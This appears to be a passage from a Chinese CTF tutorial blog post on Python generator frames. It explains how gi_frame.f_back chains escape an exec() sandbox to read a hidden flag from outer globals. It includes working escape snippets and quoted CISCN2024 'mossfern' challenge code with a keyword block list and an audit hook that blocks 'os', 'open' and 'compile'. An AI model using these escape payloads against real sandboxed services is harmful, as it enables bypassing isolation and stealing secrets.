class=\"line\">f = (i+<span class=\"number\">1</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#可以用next一步步 获取值</span></span><br><span class=\"line\"><span class=\"comment\"># print(next(f))</span></span><br><span class=\"line\"><span class=\"comment\">#也可以遍历获取所有值</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> value <span class=\"keyword\">in</span> f:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(value)</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-生成器属性\"><a class=\"markdownIt-Anchor\" href=\"#3-生成器属性\">#</a> 3、生成器属性：</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gi_code:生成器对应的code对象。</span><br><span class=\"line\">gi_frame:生成器对应的frame(栈帧)对象</span><br><span class=\"line\">gi_running:生成器函数是否在执行。生成器函数在<span class=\"keyword\">yield</span>以后、执行<span class=\"keyword\">yield</span>的下一行代码前处于frozen状态，此时这个属性为<span class=\"number\">0.</span></span><br><span class=\"line\">gi_yeildfrom:如果生成器正在从另一个生成器中<span class=\"keyword\">yield</span>值，则为该生成器对象的引；否则为<span class=\"literal\">None</span></span><br><span class=\"line\">gi_frame.f_locals:一个字典，，包含生成器当前栈的本地变量</span><br></pre></td></tr></table></figure>\n<h2 id=\"4-gi_frame的使用\"><a class=\"markdownIt-Anchor\" href=\"#4-gi_frame的使用\">#</a> 4、gi_frame 的使用：</h2>\n<p>​\t\tgi_frame 是一个与生成器和协程相关的属性。它指向生成器或协程当前 执行的帧对象，如果这个生成器或协程正在执行的话。帧对象 表示代码 执行的当前上下文，包含了局部变量、执行的字节码指令等信息。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">f</span>():</span><br><span class=\"line\">    <span class=\"keyword\">yield</span> <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">yield</span> <span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"keyword\">yield</span> <span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\">f = f()</span><br><span class=\"line\">frame = f.gi_frame</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;局部变量(Local Variables):&quot;</span>,frame.f_locals)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;全局变量(Gloobal Variables):&quot;</span>,frame.f_globals)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Code对象:&quot;</span>,frame.f_code)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Insstruction Pointer:&quot;</span>,frame.f_lasti)</span><br></pre></td></tr></table></figure>\n<p>​\t\t\t获取代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">my_generator</span>():</span><br><span class=\"line\">    <span class=\"keyword\">yield</span> <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">yield</span> <span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"keyword\">yield</span> <span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\">gen = my_generator()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取生成器的当前代码信息</span></span><br><span class=\"line\">code = gen.gi_code</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 输出生成器的当前代码信息</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>( code.co_name)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(code.co_code)</span><br><span class=\"line\"><span class=\"built_in\">print</span>( code.co_consts)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(code.co_filename)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># my_generator</span></span><br><span class=\"line\"><span class=\"comment\"># b&#x27;K\\x00\\x01\\x00\\x97\\x00d\\x01V\\x00\\x97\\x01\\x01\\x00d\\x02V\\x00\\x97\\x01\\x01\\x00d\\x03V\\x00\\x97\\x01\\x01\\x00d\\x00S\\x00&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># (None, 1, 2, 3)</span></span><br><span class=\"line\"><span class=\"comment\"># C:\\Users\\20820\\PycharmProjects\\shizhan\\bb.py</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"5-栈帧-frame介绍\"><a class=\"markdownIt-Anchor\" href=\"#5-栈帧-frame介绍\">#</a> 5、栈帧 (Frame) 介绍：</h2>\n<p>​\t\t在 Python 中，栈帧（stack frame），也称为帧（frame），是用于执行代码的数据结构。每当 Python 解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息。这些栈帧会按照调用顺序被组织成一个栈，称为调用栈。</p>\n<p>​\t\t栈帧包含了以下几个重要的属性：f_locals: 一个字典，包含了函数或方法的局部变量。键是变量名。f_globals: 一个字典，包含了函数或方法所在模块的全局变量。f_code: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。f_lasti: 整数，表示最后执行的字节码指令的索引。f_back: 指向上一级调用栈帧的引用，用于构建调用栈。</p>\n<p>​\t\t栈帧包含了以下几个重要的属性：</p>\n<blockquote>\n<p><code>f_locals</code> : 一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。<br>\n <code>f_globals</code> : 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。<br>\n <code>f_code</code> : 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。<br>\n <code>f_lasti</code> : 整数，表示最后执行的字节码指令的索引。<br>\n <code>f_back</code> : 指向上一级调用栈帧的引用，用于构建调用栈。</p>\n</blockquote>\n<h2 id=\"6-栈帧逃逸\"><a class=\"markdownIt-Anchor\" href=\"#6-栈帧逃逸\">#</a> 6、栈帧逃逸：</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s3cret=<span class=\"string\">&quot;this is flag：flag&#123;hello_World_hello_Python&#125;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">waff</span>():</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">f</span>():</span><br><span class=\"line\">        <span class=\"keyword\">yield</span> g.gi_frame.f_back</span><br><span class=\"line\"></span><br><span class=\"line\">    g = f()  <span class=\"comment\">#生成器</span></span><br><span class=\"line\">    frame = <span class=\"built_in\">next</span>(g) <span class=\"comment\">#获取到生成器的栈帧对象</span></span><br><span class=\"line\">    b = frame.f_globals[<span class=\"string\">&#x27;s3cret&#x27;</span>] <span class=\"comment\">#返回并获取前一级栈帧的globals</span></span><br><span class=\"line\">    <span class=\"comment\"># b = frame.f_back.f_globals[&#x27;s3cret&#x27;]  # 返回并获取前一级栈帧的globals</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(b)</span><br><span class=\"line\">b=waff()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#this is flag：flag&#123;hello_World_hello_Python&#125;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t在看看上面的 <code>f_globals</code> : 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。</p>\n<p>不难看出这里函数和模块本就同在一个全局，所以都有属性 s3cret，怎么看到没到全局？直接看 file 就能看出。</p>\n<p>​\t\t在给个例子：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s3cret=<span class=\"string\">&quot;this is flag&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">codes=<span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">def waff():</span></span><br><span class=\"line\"><span class=\"string\">    def f():</span></span><br><span class=\"line\"><span class=\"string\">        yield g.gi_frame.f_back</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    g = f()  #生成器</span></span><br><span class=\"line\"><span class=\"string\">    frame = next(g) #获取到生成器的栈帧对象</span></span><br><span class=\"line\"><span class=\"string\">    print(frame)</span></span><br><span class=\"line\"><span class=\"string\">    print(frame.f_back)</span></span><br><span class=\"line\"><span class=\"string\">    print(frame.f_back.f_back)</span></span><br><span class=\"line\"><span class=\"string\">    b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] #返回并获取前一级栈帧的globals</span></span><br><span class=\"line\"><span class=\"string\">    return b</span></span><br><span class=\"line\"><span class=\"string\">b=waff()</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">locals</span>=&#123;&#125;</span><br><span class=\"line\">code = <span class=\"built_in\">compile</span>(codes, <span class=\"string\">&quot;test&quot;</span>, <span class=\"string\">&quot;exec&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">exec</span>(code,<span class=\"built_in\">locals</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">locals</span>[<span class=\"string\">&quot;b&quot;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &lt;frame at 0x0000017C309E7C40, file &#x27;test&#x27;, line 8, code waff&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># &lt;frame at 0x0000017C520AF560, file &#x27;test&#x27;, line 13, code &lt;module&gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># &lt;frame at 0x0000017C521A0040, file &#x27;C:\\\\Users\\\\20820\\\\PycharmProjects\\\\shizhan\\\\bb.py&#x27;, line 19, code &lt;module&gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># this is flag</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t首先，生成器的栈帧是 g ，经过一次回溯 之后到了 waff 的栈帧，再回溯一次之后到了 exec 的栈帧，这个时候访问 <code>f_globals</code>  就到了 exec 再上一层 的作用域，也就是全局变量 。</p>\n<p>​\t\t另一种情况：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s3cret=<span class=\"string\">&quot;this is flag&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">codes=<span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">def waff():</span></span><br><span class=\"line\"><span class=\"string\">    def f():</span></span><br><span class=\"line\"><span class=\"string\">        yield g.gi_frame.f_back</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    q = (q.gi_frame.f_back.f_back.f_back.f_globals for _ in [1])</span></span><br><span class=\"line\"><span class=\"string\">    b = [*q][0][&quot;s3cret&quot;]</span></span><br><span class=\"line\"><span class=\"string\">    return b</span></span><br><span class=\"line\"><span class=\"string\">b=waff()</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">locals</span>=&#123;&#125;</span><br><span class=\"line\">code = <span class=\"built_in\">compile</span>(codes, <span class=\"string\">&quot;test&quot;</span>, <span class=\"string\">&quot;exec&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">exec</span>(code,<span class=\"built_in\">locals</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">locals</span>[<span class=\"string\">&quot;b&quot;</span>])</span><br></pre></td></tr></table></figure>\n<p>​\t\t这样也能输出 flag，和上面的相比，是进行了三次回溯，先来一个回溯结构示意：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">主程序全局帧 (包含 s3cret)</span><br><span class=\"line\">  ↑</span><br><span class=\"line\">exec 执行环境帧</span><br><span class=\"line\">  ↑</span><br><span class=\"line\">waff() 函数调用帧</span><br><span class=\"line\">  ↑</span><br><span class=\"line\">列表推导式帧 ([*q] 迭代触发)</span><br><span class=\"line\">  ↑</span><br><span class=\"line\">生成器 q 的帧 (q.gi<span class=\"built_in\">_</span>frame)</span><br></pre></td></tr></table></figure>\n<p>​\t\t首先，是生成器 q 的帧，回溯一次之后是 <code>[*q]</code>  这一行 的帧，之后才是 waff 和 exec 的帧到了 exec 的帧之后获取 globals 就可以获得到 flag 了。</p>\n<p>​\t\t为什么用 <code>[*q]</code>  运行生成器，却不用 <code>next(q)</code> ？主要是因为，大部分的沙箱题目中， <code>builtins</code>  基本上都被杨了，不能使用 next 来进行获取，所以只能使用这种办法。</p>\n<h2 id=\"来个例题ciscn2024-mossfern\"><a class=\"markdownIt-Anchor\" href=\"#来个例题ciscn2024-mossfern\">#</a> 来个例题 (CISCN2024 mossfern)：</h2>\n<p>​\t\tmain.py 的代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> subprocess</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, request, jsonify</span><br><span class=\"line\"><span class=\"keyword\">from</span> uuid <span class=\"keyword\">import</span> uuid1</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">runner = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;/app/runner.py&quot;</span>, <span class=\"string\">&quot;r&quot;</span>, encoding=<span class=\"string\">&quot;UTF-8&quot;</span>).read()</span><br><span class=\"line\">flag = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;/flag&quot;</span>, <span class=\"string\">&quot;r&quot;</span>, encoding=<span class=\"string\">&quot;UTF-8&quot;</span>).readline().strip()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.post(<span class=\"params\"><span class=\"string\">&quot;/run&quot;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">run</span>():</span><br><span class=\"line\">    <span class=\"built_in\">id</span> = <span class=\"built_in\">str</span>(uuid1())</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        data = request.json</span><br><span class=\"line\">        <span class=\"built_in\">open</span>(<span class=\"string\">f&quot;/app/uploads/<span class=\"subst\">&#123;<span class=\"built_in\">id</span>&#125;</span>.py&quot;</span>, <span class=\"string\">&quot;w&quot;</span>, encoding=<span class=\"string\">&quot;UTF-8&quot;</span>).write(</span><br><span class=\"line\">            runner.replace(<span class=\"string\">&quot;THIS_IS_SEED&quot;</span>, flag).replace(<span class=\"string\">&quot;THIS_IS_TASK_RANDOM_ID&quot;</span>, <span class=\"built_in\">id</span>))</span><br><span class=\"line\">        <span class=\"built_in\">open</span>(<span class=\"string\">f&quot;/app/uploads/<span class=\"subst\">&#123;<span class=\"built_in\">id</span>&#125;</span>.txt&quot;</span>, <span class=\"string\">&quot;w&quot;</span>, encoding=<span class=\"string\">&quot;UTF-8&quot;</span>).write(data.get(<span class=\"string\">&quot;code&quot;</span>, <span class=\"string\">&quot;&quot;</span>))</span><br><span class=\"line\">        run = subprocess.run(</span><br><span class=\"line\">            [<span class=\"string\">&#x27;python&#x27;</span>, <span class=\"string\">f&quot;/app/uploads/<span class=\"subst\">&#123;<span class=\"built_in\">id</span>&#125;</span>.py&quot;</span>],</span><br><span class=\"line\">            stdout=subprocess.PIPE,</span><br><span class=\"line\">            stderr=subprocess.PIPE,</span><br><span class=\"line\">            timeout=<span class=\"number\">3</span></span><br><span class=\"line\">        )</span><br><span class=\"line\">        result = run.stdout.decode(<span class=\"string\">&quot;utf-8&quot;</span>)</span><br><span class=\"line\">        error = run.stderr.decode(<span class=\"string\">&quot;utf-8&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(result, error)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> os.path.exists(<span class=\"string\">f&quot;/app/uploads/<span class=\"subst\">&#123;<span class=\"built_in\">id</span>&#125;</span>.py&quot;</span>):</span><br><span class=\"line\">            os.remove(<span class=\"string\">f&quot;/app/uploads/<span class=\"subst\">&#123;<span class=\"built_in\">id</span>&#125;</span>.py&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> os.path.exists(<span class=\"string\">f&quot;/app/uploads/<span class=\"subst\">&#123;<span class=\"built_in\">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class=\"line\">            os.remove(<span class=\"string\">f&quot;/app/uploads/<span class=\"subst\">&#123;<span class=\"built_in\">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> jsonify(&#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;result&quot;</span>: <span class=\"string\">f&quot;<span class=\"subst\">&#123;result&#125;</span>\\n<span class=\"subst\">&#123;error&#125;</span>&quot;</span></span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> os.path.exists(<span class=\"string\">f&quot;/app/uploads/<span class=\"subst\">&#123;<span class=\"built_in\">id</span>&#125;</span>.py&quot;</span>):</span><br><span class=\"line\">            os.remove(<span class=\"string\">f&quot;/app/uploads/<span class=\"subst\">&#123;<span class=\"built_in\">id</span>&#125;</span>.py&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> os.path.exists(<span class=\"string\">f&quot;/app/uploads/<span class=\"subst\">&#123;<span class=\"built_in\">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class=\"line\">            os.remove(<span class=\"string\">f&quot;/app/uploads/<span class=\"subst\">&#123;<span class=\"built_in\">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> jsonify(&#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;result&quot;</span>: <span class=\"string\">&quot;None&quot;</span></span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    app.run(<span class=\"string\">&quot;0.0.0.0&quot;</span>, <span class=\"number\">5000</span>)</span><br></pre></td></tr></table></figure>\n<p>​\t\t没啥太大得到用处，大概就是每一次访问 <code>/run</code> <span class=\"exturl\" data-url=\"aHR0cDovL3huLS11dWlkLWs4NGZ1aXQxMWd0eGt1eTViZGZheDAwei5weQ==\"> 路由就生成一个 uuid.py</span>，将 flag 替换进文件占位符，之后，再生成一个 uuid.txt 文件，将用户上传的代码写入，之后运行代码，并结果返回。</p>\n<p>​\t\t<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1ydW5uZXItOTE3aWs3MGJpbTNmYS5weQ==\">之后看看 runner.py</span>：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">source_simple_check</span>(<span class=\"params\">source</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    Check the source with pure string in string, prevent dangerous strings</span></span><br><span class=\"line\"><span class=\"string\">    :param source: source code</span></span><br><span class=\"line\"><span class=\"string\">    :return: None</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">from</span> sys <span class=\"keyword\">import</span> exit</span><br><span class=\"line\">    <span class=\"keyword\">from</span> builtins <span class=\"keyword\">import</span> <span class=\"built_in\">print</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        source.encode(<span class=\"string\">&quot;ascii&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> UnicodeEncodeError:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;non-ascii is not permitted&quot;</span>)</span><br><span class=\"line\">        exit()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> [<span class=\"string\">&quot;__&quot;</span>, <span class=\"string\">&quot;getattr&quot;</span>, <span class=\"string\">&quot;exit&quot;</span>]:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> i <span class=\"keyword\">in</span> source.lower():</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(i)</span><br><span class=\"line\">            exit()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">block_wrapper</span>():</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    Check the run process with sys.audithook, no dangerous operations should be conduct</span></span><br><span class=\"line\"><span class=\"string\">    :return: None</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">audit</span>(<span class=\"params\">event, args</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">from</span> builtins <span class=\"keyword\">import</span> <span class=\"built_in\">str</span>, <span class=\"built_in\">print</span></span><br><span class=\"line\">        <span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> [<span class=\"string\">&quot;marshal&quot;</span>, <span class=\"string\">&quot;__new__&quot;</span>, <span class=\"string\">&quot;process&quot;</span>, <span class=\"string\">&quot;os&quot;</span>, <span class=\"string\">&quot;sys&quot;</span>, <span class=\"string\">&quot;interpreter&quot;</span>, <span class=\"string\">&quot;cpython&quot;</span>, <span class=\"string\">&quot;open&quot;</span>, <span class=\"string\">&quot;compile&quot;</span>, <span class=\"string\">&quot;gc&quot;</span>]:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> i <span class=\"keyword\">in</span> (event + <span class=\"string\">&quot;&quot;</span>.join(<span class=\"built_in\">str</span>(s) <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> args)).lower():</span><br><span 